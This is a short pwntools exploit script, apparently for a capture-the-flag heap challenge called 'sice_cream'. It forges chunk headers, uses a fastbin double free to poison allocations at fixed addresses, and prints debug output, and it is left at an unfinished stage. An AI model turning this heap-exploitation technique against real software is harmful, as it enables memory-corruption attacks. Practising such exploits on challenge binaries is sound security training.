import sys, time
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'
BIN = './sice_cream'
FASTBIN_FAKE = 0x602130
UNSORTED_FAKE = 0x602050
p = process(['./ld-2.23.so', '--library-path', '.', BIN], stderr=process.STDOUT)


def buy(size, data):
    p.recvuntil(b'> '); p.send(b'1\n')
    p.recvuntil(b'> '); p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Here you go!')


def eat(idx, wait=True):
    p.recvuntil(b'> '); p.send(b'2\n')
    p.recvuntil(b'> '); p.send(str(idx).encode() + b'\n')
    if wait:
        return p.recvuntil(b'Yum!', timeout=2)


buf = bytearray(b'A' * 0x100)
buf[0x18:0x20] = p64(0x91)
buf[0xa8:0xb0] = p64(0x21)
buf[0xc8:0xd0] = p64(0x21)
buf[0xf8:0x100] = p64(0x60)
p.recvuntil(b'Whats your name?'); p.recvuntil(b'> '); p.send(bytes(buf))
buy(0x58, b'A' * 0x58); buy(0x58, b'B' * 0x58)
eat(0); eat(1); eat(0)
buy(0x58, p64(FASTBIN_FAKE) + b'C' * (0x58 - 8))
buy(0x58, b'D' * 0x58)
buy(0x58, b'E' * 0x58)
buy(0x58, p64(UNSORTED_FAKE) + p64(0) * 10)
print("prete")
try:
    r = eat(0)
    print("ok:", r)
except EOFError:
    pass
time.sleep(0.3)
try:
    data = p.recvrepeat(0.5)
    print("RESTE:", data[:500])
except Exception as e:
    print("err", e)
print("buffer:", p.buffer[:500] if hasattr(p, 'buffer') else '?')
p.close()
